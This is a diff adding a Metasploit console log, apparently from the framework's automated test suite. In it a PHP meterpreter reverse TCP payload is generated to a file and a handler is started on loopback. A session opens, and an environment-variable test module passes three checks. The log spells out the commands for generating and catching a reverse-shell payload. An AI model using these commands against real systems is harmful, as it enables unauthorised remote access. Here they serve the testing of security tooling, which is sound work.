@@ -1,0 +1,21 @@
+use php/meterpreter_reverse_tcp
+Stopping all jobs...
+msf6 post(test/file) > generate -o D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220128-2820-k4p2u1.php -f raw lport=6017 lhost=127.0.0.1
+msf6 payload(php/meterpreter_reverse_tcp) > [*] Writing 34276 bytes to D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220128-2820-k4p2u1.php...
+msf6 payload(php/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 16
+msf6 payload(php/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6017 
+[*] Meterpreter session 17 opened (127.0.0.1:6017 -> 127.0.0.1:50065 ) at 2022-01-28 21:11:30 +0000
+use test/get_env
+msf6 post(test/get_env) > run session=17 addentropy=true verbose=true
+[*] Running against session 17
+[*] Session type is meterpreter and platform is windows
+[+] should return windows path
+[+] should handle % signs
+[+] should return multiple envs
+[*] Testing complete in 0.0304389
+[*] Passed: 3; Failed: 0
+[*] Post module execution completed
+msf6 post(test/get_env) > 
